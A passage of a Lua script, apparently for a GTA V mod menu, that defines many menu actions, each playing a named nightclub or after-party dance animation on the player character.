    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 38", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 39", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 40", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 41", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 42", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 43", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 44", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 45", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 46", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 47", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 48", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_15_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 49", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 50", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 51", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 52", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 53", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclubmed, "Nightclub Medium Intensity 54", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@med_intensity", "mi_dance_facedj_17_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_09_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 15", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_11_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 30", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_13_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 31", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 32", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 33", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 34", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 35", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 36", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 37", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 38", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 39", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 40", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 41", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 42", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_15_v2_female^6", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 43", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^1", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 44", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^2", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 45", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^3", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 46", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^4", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 47", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^5", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 48", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v1_female^6", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 49", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^1", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 50", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^2", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 51", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^3", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 52", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^4", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 53", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^5", -1)
end)
menu.action(dances_vroot_nightclublow, "Nightclub Low Intensity 54", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_facedj@low_intesnsity", "li_dance_facedj_17_v2_female^6", -1)
end)

----- After Party High/Med/Low -----

menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_09_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_11_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_11_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 15", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_11_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_11_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_11_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_11_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_13_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_13_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_13_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_13_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_13_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_13_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 30", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 31", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 32", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 33", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 34", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 35", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 36", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_15_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 37", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 38", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 39", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 40", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 41", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 42", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 43", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 44", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 45", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 46", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 47", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartyhigh, "After Party High Intensity 48", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@hi_intensity", "hi_dance_crowd_17_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_09_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_09_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_09_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_09_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_09_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_09_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_10_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_10_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_10_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_10_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_10_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_10_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 15", {""}, "", function(on_click)
